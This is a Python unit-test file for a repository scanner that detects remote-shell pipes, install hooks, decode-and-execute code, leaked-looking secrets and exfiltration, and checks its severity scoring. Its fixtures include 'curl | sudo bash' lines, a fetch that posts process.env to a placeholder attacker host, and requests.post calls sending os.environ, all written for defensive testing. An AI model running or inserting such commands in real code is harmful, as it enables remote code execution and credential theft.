import tempfile
import unittest
from pathlib import Path

from repo_scout.models import RepoSignals, RepoSummary
from repo_scout.scanner import scan_path
from repo_scout.scoring import score_repository


class ScannerTests(unittest.TestCase):
    def test_flags_remote_shell_execution(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "install.sh").write_text("curl https://example.test/install.sh | bash\n")

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "remote-shell" for f in findings))

    def test_flags_package_install_hooks(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "package.json").write_text('{"scripts":{"postinstall":"node steal.js"}}')

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "package-install-hook" for f in findings))

    def test_flags_obfuscated_execution(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "loader.py").write_text("import base64\nexec(base64.b64decode(payload))\n")

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "obfuscated-execution" for f in findings))

    def test_flags_secret_like_strings(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            # Built by concatenation so the file never contains a literal matching
            # GitHub's token pattern, which secret scanning would flag on push.
            token = "ghp_" + "1234567890abcdef" * 2 + "1234"
            (path / ".env.example").write_text(f"GITHUB_TOKEN={token}\n")

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "secret-like-string" for f in findings))

    def test_flags_binary_blob(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp)
            (path / "payload.bin").write_bytes(b"\x00\x01\x02\x03" * 200)

            findings = scan_path(path)

        self.assertTrue(any(f.rule == "binary-blob" for f in findings))


if __name__ == "__main__":
    unittest.main()


class ScannerRealWorldRegressions(unittest.TestCase):
    """Defects measured against 385 real public repositories on 2026-09-08.

    Every case here is a thing v0.1 got wrong on real files while the unit
    suite stayed green. None of the payloads is a real credential: the tokens
    are invented, and the hosts are all under the reserved `.invalid` TLD.
    """

    PAYLOAD = "curl https://example.invalid/install.sh | bash"

    def _scan(self, files):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for name, body in files.items():
                target = root / name
                target.parent.mkdir(parents=True, exist_ok=True)
                if isinstance(body, bytes):
                    target.write_bytes(body)
                else:
                    target.write_text(body, encoding="utf-8")
            return scan_path(root)

    def test_reads_the_languages_repositories_are_written_in(self):
        """v0.1 read 15 extensions and opened a median 7.7% of a real repo.

        Go, Rust, Java, C, TypeScript-with-JSX, notebooks and Markdown were all
        invisible, and a README is the most common place `curl … | bash` appears.
        """
        for name in (
            "a.go", "a.rs", "a.java", "a.c", "a.cpp", "a.php", "a.tsx",
            "a.jsx", "a.ipynb", "README.md", "a.swift", "a.kt", "a.lua",
            "a.tf", "a.bat", "a.zsh", "a.ini", "a.gradle", "a.vue",
        ):
            with self.subTest(container=name):
                findings = self._scan({name: self.PAYLOAD + "\n"})
                self.assertTrue(
                    any(f.rule == "remote-shell" for f in findings),
                    f"{name} was not read",
                )

    def test_reads_extensionless_scripts_by_shebang(self):
        findings = self._scan({"scripts/bootstrap": "#!/bin/sh\n" + self.PAYLOAD + "\n"})
        self.assertTrue(any(f.rule == "remote-shell" for f in findings))

    def test_reads_utf16(self):
        """A file saved by a Windows editor has a NUL beside every character.

        v0.1 sniffed it as binary, skipped it, and reported nothing.
        """
        body = (self.PAYLOAD + "\n").encode("utf-16")
        findings = self._scan({"a.ps1": body})
        self.assertTrue(any(f.rule == "remote-shell" for f in findings))

    def test_a_finding_covers_a_bounded_span_and_shows_what_matched(self):
        """v0.1 used `.*` under re.S, so one finding spanned a median 51% of
        the file and, at worst, 3,492,650 characters. The evidence field showed
        the first 200 characters of that span, which contained nothing relevant.
        """
        noise = "\n".join(f"line {i} = harmless()" for i in range(5000))
        body = "eval(x)\n" + noise + "\natob(y)\n"
        findings = self._scan({"a.js": body})
        self.assertFalse(
            [f for f in findings if f.rule == "obfuscated-execution"],
            "an `eval(` and an `atob(` 5,000 lines apart are not one finding",
        )
        hit = self._scan({"a.js": "eval(atob(payload))\n"})
        obf = [f for f in hit if f.rule == "obfuscated-execution"]
        self.assertEqual(len(obf), 1)
        self.assertIn("atob", obf[0].evidence)
        self.assertLessEqual(len(obf[0].evidence), 200)

    def test_finding_carries_a_line_number(self):
        findings = self._scan({"a.sh": "echo one\necho two\n" + self.PAYLOAD + "\n"})
        remote = [f for f in findings if f.rule == "remote-shell"]
        self.assertTrue(remote)
        self.assertTrue(remote[0].path.endswith(":3"), remote[0].path)

    def test_one_noisy_file_cannot_fill_the_report(self):
        findings = self._scan({"a.sh": (self.PAYLOAD + "\n") * 500})
        self.assertLessEqual(len([f for f in findings if f.rule == "remote-shell"]), 3)

    def test_husky_is_not_a_risk(self):
        """`husky` is the standard git-hook installer. v0.1 reported it as a
        high-severity install hook on ordinary JavaScript repositories."""
        body = '{"scripts": {"prepare": "husky"}}'
        findings = self._scan({"package.json": body})
        self.assertFalse([f for f in findings if f.rule == "package-install-hook"])

    def test_a_real_install_hook_is_still_reported(self):
        body = '{"scripts": {"postinstall": "curl https://example.invalid/x.sh | sh"}}'
        findings = self._scan({"package.json": body})
        self.assertTrue([f for f in findings if f.rule == "package-install-hook"])

    def test_an_identifier_is_not_a_secret(self):
        """v0.1 matched the name of a variable, so `api_key = _config_value`
        was reported as a secret on real repositories."""
        for body in (
            "api_key = _sandbox_config_value\n",
            "api_key=select_api_key_for_embed_models\n",
            "self.api_key = get_api_key_from_settings()\n",
        ):
            with self.subTest(body=body.strip()):
                findings = self._scan({"a.py": body})
                self.assertFalse([f for f in findings if f.rule == "secret-like-string"])

    def test_a_quoted_literal_secret_is_still_reported(self):
        findings = self._scan({"a.py": 'api_key = "ZZZZinventedZZZZ0123456789abcdef"\n'})
        self.assertTrue([f for f in findings if f.rule == "secret-like-string"])

    def test_reading_a_proxy_setting_is_not_exfiltration(self):
        """114 of the findings in the measured run were this shape."""
        for body in (
            'os.environ.get("all_proxy") or os.environ.get("http_proxy")\n',
            'const base = process.env.PLAYWRIGHT_BASE_URL ?? "http://localhost:3000";\n',
        ):
            with self.subTest(body=body.strip()):
                findings = self._scan({"a.py": body})
                self.assertFalse([f for f in findings if f.rule == "possible-exfiltration"])

    def test_exfiltration_is_found_in_either_order(self):
        """v0.1 required the credential before the sink, so the idiomatic
        Python form was missed."""
        for body in (
            'token = os.environ["SECRET"]; requests.post("https://x.invalid", data=token)\n',
            'requests.post("https://x.invalid", data=os.environ)\n',
        ):
            with self.subTest(body=body.strip()):
                findings = self._scan({"a.py": body})
                self.assertTrue([f for f in findings if f.rule == "possible-exfiltration"])

    def test_minified_javascript_is_not_obfuscated_execution(self):
        """Measured on real bundles in the corpus, twice.

        v0.1 matched `eval(`/`function(` to the end of the file under `re.S`,
        so Chart.js and highlight.js were `critical`. The first rewrite bounded
        the span but kept `(?i)` on the whole pattern, which made `Function`
        match the JavaScript keyword `function` -- and a minified bundle is one
        long line of `function(`. With `unescape` in the decode list, ordinary
        URL handling completed the match. Both are gone: the execution anchors
        are case-sensitive and `unescape` is not a decode.
        """
        minified = (
            '!function(t,e){"object"==typeof exports&&"undefined"!=typeof module'
            '?e(exports,require("jquery")):"function"==typeof define&&define.amd'
            '?define(["exports","jquery"],e):e(t.bootstrap={},t.jQuery)}'
            '(this,function(t,e){"use strict";var n=unescape(encodeURIComponent(t));'
        )
        findings = self._scan({"vendor.min.js": minified})
        self.assertFalse([f for f in findings if f.rule == "obfuscated-execution"])

    def test_a_real_decode_and_execute_is_still_reported(self):
        for body in (
            "eval(atob(payload))\n",
            "exec(base64.b64decode(blob))\n",
            'new Function(atob("cGF5bG9hZA=="))()\n',
        ):
            with self.subTest(body=body.strip()):
                findings = self._scan({"a.js": body})
                self.assertTrue(
                    [f for f in findings if f.rule == "obfuscated-execution"], body)

    def test_a_finding_is_weighted_by_where_it_sits(self):
        """Measured over 385 real repositories: most `curl | bash` matches are
        the project's own documented install line, and most secret-shaped
        strings are fixtures and documentation placeholders. Reporting them is
        right; scoring a README `critical` is not, because one such finding
        drives AVOID on its own."""
        cases = {
            "install.sh": "critical",
            "README.md": "high",
            "docs/guide.md": "high",
            "examples/quickstart.sh": "high",
            "tests/test_install.py": "high",
            "internal/thing_test.go": "high",
            "src/fixtures/payload.sh": "high",
            # `.txt` is not documentation: `token.txt` is where credentials
            # actually get left, and the one real case in the corpus was an
            # installer template.
            "install.txt": "critical",
        }
        for path, expected in cases.items():
            with self.subTest(path=path):
                findings = self._scan({path: self.PAYLOAD + "\n"})
                remote = [f for f in findings if f.rule == "remote-shell"]
                self.assertTrue(remote, f"nothing found in {path}")
                self.assertEqual(remote[0].severity, expected)

    def test_a_downgraded_finding_says_why(self):
        findings = self._scan({"README.md": self.PAYLOAD + "\n"})
        remote = [f for f in findings if f.rule == "remote-shell"][0]
        self.assertIn("documentation", remote.message)

    def test_an_example_is_documentation_not_a_test_fixture(self):
        """`examples?` was in both context patterns and the fixture one is
        tested first, so `examples/quickstart.sh` was labelled a test
        fixture."""
        findings = self._scan({"examples/quickstart.sh": self.PAYLOAD + "\n"})
        remote = [f for f in findings if f.rule == "remote-shell"][0]
        self.assertIn("documentation", remote.message)

    def test_the_downgrade_cannot_be_used_to_hide_hostile_code(self):
        """The attack the downgrade opened, found in adversarial review.

        `critical` originally dropped two steps, to 15 risk points against a
        70-point AVOID threshold, so a repository could carry several plainly
        hostile files and still be labelled USE as long as they sat in a
        directory the repository's own author named `examples/` or `tests/`.
        One documented install line must not force AVOID. Hostile code must
        never reach USE wherever it sits, and must still reach AVOID when it
        is in the repository's own source.
        """
        exfil = ('fetch("https://evil.invalid/c",{method:"POST",'
                 'body:JSON.stringify(process.env)})')
        findings = self._scan({
            "examples/quickstart.sh": "curl -fsSL https://evil.invalid/s2 | sudo bash\n",
            "examples/upload.js": exfil + "\n",
        })
        signals = RepoSignals(has_readme="present", has_license="present",
                              has_tests="present", has_ci="present",
                              has_package_metadata="present")
        summary = RepoSummary("repo", "Local repository scan", "")
        hidden = score_repository(summary, signals, findings, scanned=True,
                                  metadata=False, query_accepted=False)
        self.assertEqual(hidden.verdict, "INSPECT FIRST",
                         [f.severity for f in findings])
        self.assertNotEqual(hidden.verdict, "USE")

        # The same two files in the repository's own source still reach AVOID,
        # so the relief is bounded to where it is meant to apply.
        in_source = self._scan({
            "src/quickstart.sh": "curl -fsSL https://evil.invalid/s2 | sudo bash\n",
            "src/upload.js": exfil + "\n",
        })
        exposed = score_repository(summary, signals, in_source, scanned=True,
                                   metadata=False, query_accepted=False)
        self.assertEqual(exposed.verdict, "AVOID")

    def test_one_documented_install_line_does_not_force_avoid(self):
        findings = self._scan({"README.md": self.PAYLOAD + "\n"})
        score = score_repository(
            RepoSummary("repo", "Local repository scan", ""),
            RepoSignals(has_readme="present", has_license="present",
                        has_tests="present", has_ci="present",
                        has_package_metadata="present"),
            findings, scanned=True, metadata=False, query_accepted=False,
        )
        self.assertNotEqual(score.verdict, "AVOID")

    def test_a_pattern_may_use_the_second_line_of_its_window(self):
        """Four of the five patterns excluded `\n`, so the two-line window did
        nothing for them and a shell line continuation -- ordinary formatting
        in real installers -- defeated `remote-shell` entirely."""
        cases = {
            "a.sh": ("curl -fsSL https://example.invalid/i.sh \\\n  | bash\n",
                     "remote-shell"),
            "a.js": ("eval(\n  atob(payload))\n", "obfuscated-execution"),
            "a.py": ("requests.post(url,\n    data=os.environ)\n",
                     "possible-exfiltration"),
        }
        for name, (body, rule) in cases.items():
            with self.subTest(container=name):
                findings = self._scan({name: body})
                self.assertTrue([f for f in findings if f.rule == rule], body)
